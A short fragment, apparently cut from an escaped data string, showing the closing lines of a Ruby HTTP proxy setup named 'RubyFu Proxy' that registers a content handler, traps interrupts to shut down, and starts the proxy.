\"RubyFu Proxy\",\n                                     ProxyContentHandler: handler\n\ntrap 'INT'  do proxy.shutdown end\n\nproxy.start \n```"]